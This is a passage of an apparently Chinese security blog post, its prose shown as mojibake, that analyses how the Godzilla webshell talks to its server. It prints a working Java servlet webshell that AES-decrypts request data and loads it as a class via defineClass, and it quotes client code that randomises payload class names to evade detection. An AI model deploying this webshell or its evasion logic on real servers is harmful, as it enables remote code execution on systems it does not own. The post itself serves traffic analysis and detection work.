class="token class-name">Class</span> base64<span class="token punctuation">;</span>        <span class="token class-name">String</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getEncoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encodeToString"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Encoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> <span class="token class-name">Encoder</span> <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token class-name">Encoder</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"encode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Encoder</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span><span class="token class-name">String</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span> base64<span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.util.Base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getDecoder"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>base64<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decode"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                base64 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.misc.BASE64Decoder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> decoder <span class="token operator">=</span> base64<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> decoder<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"decodeBuffer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>decoder<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">x</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s<span class="token punctuation">,</span> <span class="token keyword">boolean</span> m<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span> c <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span>m <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>spec<span class="token punctuation">.</span></span>SecretKeySpec</span><span class="token punctuation">(</span>xc<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ ¹æ®mçš„å€¼åˆ¤æ–­æ˜¯åŠ å¯†è¿˜æ˜¯è§£å¯†ï¼Œmæ˜¯trueçš„æ—¶å€™å˜é‡ä¸º1ï¼Œè¿™æ—¶å€™è¡¨ç¤ºåŠ å¯†æ¨¡å¼ï¼Œåä¹‹æ˜¯è§£å¯†æ¨¡å¼</span>            <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Class</span> <span class="token function">defClass</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span> defMethod <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        defMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>urlClassLoader<span class="token punctuation">,</span> classBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classBytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPost</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token function">base64Decode</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>pass<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            data <span class="token operator">=</span> <span class="token function">x</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>payload <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  payload <span class="token operator">=</span> <span class="token function">defClass</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//ç”¨äºç¬¬ä¸€æ¬¡æ¥å—è¯·æ±‚åˆå§‹åŒ–payload</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span> arrOut <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//                Object f = payload.newInstance(); </span>                <span class="token class-name">Object</span> f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"basic.payload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æœ¬åœ°åŠ è½½payloadï¼Œç”¨äºåŠ¨æ€è°ƒè¯•</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                f<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>arrOut<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>md5<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨å“¥æ–¯æ‹‰ä¸»ç•Œé¢ï¼Œç‚¹å‡»æµ‹è¯•ä¼šåœ¨burpå‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œç„¶åå“¥æ–¯æ‹‰ä¼šå¼¹æ¡†å‡ºç°Successï¼Œè¿™æ—¶å€™å†ç‚¹å‡»ç¡®å®šï¼Œå“¥æ–¯æ‹‰ä¼šå‘èµ·ç¬¬ä¸‰æ¬¡è¯·æ±‚ï¼Œå…ˆåˆ†æè¿™ä¸‰æ¬¡è¯·æ±‚çš„æ•°æ®åŒ…ä»¥åŠå“¥æ–¯æ‹‰éƒ½åšäº†ä»€ä¹ˆäº‹æƒ…ã€‚<br><img src="/2022/05/17/godzilla/1.png"></p><h3 id="ç¬¬ä¸€æ¬¡è¯·æ±‚"><a href="#ç¬¬ä¸€æ¬¡è¯·æ±‚" class="headerlink" title="ç¬¬ä¸€æ¬¡è¯·æ±‚"></a>ç¬¬ä¸€æ¬¡è¯·æ±‚</h3><p>æ ¹æ®ä¸Šé¢<code>HelloServlet.java</code>æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°å“¥æ–¯æ‹‰åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä½¿ç”¨äº†AESåŠ è§£å¯†ï¼Œåœ¨æœåŠ¡ç«¯å…ˆbase64è§£ç ï¼Œç„¶åAESè§£å¯†æ•°æ®åŒ…ï¼š<br><img src="/2022/05/17/godzilla/2.png"><br>æŠŠburpçš„æ•°æ®åŒ…å¤åˆ¶ä¹‹åï¼Œæœ¬åœ°è§£å¯†çœ‹çœ‹æ˜¯ä»€ä¹ˆå†…å®¹ï¼š<br><img src="/2022/05/17/godzilla/3.png"><br>å¯ä»¥ä»å›¾é‡Œçœ‹å‡ºæ¥å¤§æ¦‚æ˜¯ä¸ªClassæ–‡ä»¶ï¼Œä¿å­˜åˆ°æœ¬åœ°ä¹‹åï¼Œåç¼–è¯‘å¯ä»¥ä¹‹åä¼šå‘ç°è¿™ä¸ªä»£ç å’Œ<code>payload.java</code>é™¤äº†ç±»åä¸åŒï¼ŒåŠŸèƒ½ä»£ç ä¸Šå®Œå…¨ä¸€æ ·ã€‚å“¥æ–¯æ‹‰å®ç°çš„è¿™éƒ¨åˆ†ä»£ç åœ¨<code>JavaShell.class</code>é‡Œé¢ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token class-name">String</span> <span class="token function">randomName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classNames <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameSet<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>classNames<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">final</span> <span class="token keyword">int</span> index <span class="token operator">=</span> functions<span class="token punctuation">.</span><span class="token function">randomInt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> classNames<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>            className <span class="token operator">=</span> classNames<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameSet<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> className<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">dynamicUpdateClassName</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> protoName<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classContent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>classContent<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">randomName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>protoName<span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"%s ----->>>>> %s"</span><span class="token punctuation">,</span> protoName<span class="token punctuation">,</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        classContent <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> classContent<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>dynamicClassNameHashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>protoName<span class="token punctuation">,</span> protoName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> classContent<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸»è¦åŠŸèƒ½æ˜¯åŠ¨æ€æ”¹å˜<code>payload.class</code>çš„ç±»åï¼Œä¼šä»<code>classNames.txt</code>é‡Œé¢éšæœºé€‰å–ä¸€ä¸ªåå­—ï¼š<br><img src="/2022/05/17/godzilla/4.png"><br>è¿™æ˜¯ç¬¬ä¸€ä¸ªè¯·æ±‚çš„å‘é€æµç¨‹ï¼Œåšäº†ä¸¤ä»¶äº‹ï¼š</p><ol><li>æŠŠå“¥æ–¯æ‹‰é‡Œé¢çš„<code>payload.class</code>æ›´æ–°ä¸ºéšæœºçš„ç±»åï¼Œç„¶åAESåŠ å¯†å†ç»è¿‡base64å‘é€åˆ°æœåŠ¡ç«¯çš„shell</li><li>æœåŠ¡ç«¯çš„shellè§£ç è§£å¯†ä¹‹åï¼Œè°ƒç”¨<code>defineClass</code>åŠ è½½åˆ°JVMï¼Œåˆå§‹åŒ–payloadå˜é‡</li></ol><p><img src="/2022/05/17/godzilla/5.png"></p><p>å…³äº<code>defineClass</code>çš„ç”¨æ³•ï¼Œå¯ä»¥çœ‹å®˜æ–¹çš„ä»£ç æ³¨é‡Šï¼Œè´Ÿè´£æŠŠbyte[]è½¬æ¢ä¸ºClassï¼š</p><blockquote><p>However, some classes may not originate from a file; they may originate from other sources, such as the network, or they could be constructed by an application. The method {@link #defineClass(String, byte&gt;[], int, int) defineClass} converts an array of bytes into an instance of class Class. Instances of this newly defined class can be created using {@link Class#newInstance Class.newInstance}.</p></blockquote><h3 id="ç¬¬äºŒæ¬¡è¯·æ±‚"><a href="#ç¬¬äºŒæ¬¡è¯·æ±‚" class="headerlink" title="ç¬¬äºŒæ¬¡è¯·æ±‚"></a>ç¬¬äºŒæ¬¡è¯·æ±‚</h3><p>ç¬¬äºŒæ¬¡è¯·æ±‚ï¼ŒæŒ‰ç…§åŒæ ·çš„æ–¹å¼è§£å¯†æ•°æ®åŒ…ï¼Œä¼šå‘ç°å‡ºæ¥çš„æ˜¯ä¸€å †ä¹±ç ï¼š<br><img src="/2022/05/17/godzilla/6.png"><br>ä¸è¦æ…Œï¼Œå…ˆä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åé‡å‘½åä¸ºgzæ–‡ä»¶ï¼Œå†ä½¿ç”¨gunzipè§£å‹ä¹‹åæŸ¥çœ‹æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æ˜¯<code>methodNametest</code><br>åœ¨å“¥æ–¯æ‹‰æºä»£ç é‡Œé¢ï¼Œå¯ä»¥æ‰£å‡ºæ¥ç›¸å…³å®ç°:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token class-name">ReqParameter</span> parameter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReqParameter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token 